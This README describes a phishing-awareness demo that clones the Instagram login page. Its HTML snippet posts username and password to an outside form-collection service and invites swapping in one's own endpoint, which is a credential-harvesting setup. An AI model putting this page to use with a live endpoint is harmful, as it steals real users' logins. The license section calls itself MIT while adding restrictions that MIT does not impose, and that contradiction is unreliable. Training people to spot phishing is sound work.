# Instagram Login Simulation (Educational Purpose Only)  

⚠️ **Warning**: This is a **demonstration tool** for cybersecurity education only. Unauthorized phishing is illegal.

---

## 📌 Overview  
A realistic Instagram login page clone designed to:  
- Teach how phishing attacks work  
- Demonstrate red flags in fake login pages  
- Train users to verify website authenticity  

**Features**:  
✔️ Responsive design (mobile/desktop)  
✔️ Form input validation  
✔️ Fake submission handler (no data is actually sent)  

---

## 🛠️ Setup  
1. **Download Files**:  
   ```bash
   git clone https://github.com/yourusername/fake-instagram-demo.git
   cd fake-instagram-demo
   ```

2. **Run Locally**:  
   - Open `index.html` in any browser  
   - No server required (pure HTML/CSS/JS)  

---

## 🔍 How It Works  
## Code Structure  
```
/  
├── index.html          # Main phishing page  
├── styles.css          # Instagram-like styling  
├── script.js           # Form handling logic  
└── /img/               # Logo and cover images  
```

### Key Components  
1. **HTML Form**:  
   ```html
   <form action="https://formsubmit.co/demo" method="POST">
     <input type="text" name="username" placeholder="Email/Phone" required>
     <input type="password" name="password" placeholder="Password" required>
   </form>
   ```
   - *Note: Uses a demo FormSubmit endpoint - replace with your own for testing*

2. **JavaScript Validation**:  
   ```js
   // Prevents real submission - shows educational alert
   form.addEventListener('submit', (e) => {
     e.preventDefault();
     alert("This is a phishing simulation!\nNever enter real credentials on untrusted pages.");
   });
   ```

---

## ⚠️ Ethical Guidelines  
- **Legal Use**: Only demonstrate on:  
  - Yourself  
  - Willing participants (with explicit consent)  
  - Controlled training environments  

- **Illegal Use Includes**:  
  - Deploying this on real users without permission  
  - Actually collecting credentials  
  - Hosting this on public domains  

---

## 📚 Educational Scenarios  
1. **Spotting Fake Logins**:  
   - Check URL (instagram.com vs instagram-login.net)  
   - Look for SSL padlock 🔒  
   - Verify page design inconsistencies  

2. **Demo Flow**:  
   ```mermaid
   graph LR
   A[User enters fake credentials] --> B[JS shows educational alert]
   B --> C[Page resets form]
   ```

---

## 📜 License  
This project is **[MIT_LICENSE](LICENSE )** - you may:  
- Use for **non-commercial education**  
- **Not** redistribute modified versions  
- **Not** use for actual phishing  

Developed for ethical security training by [RAVI].  
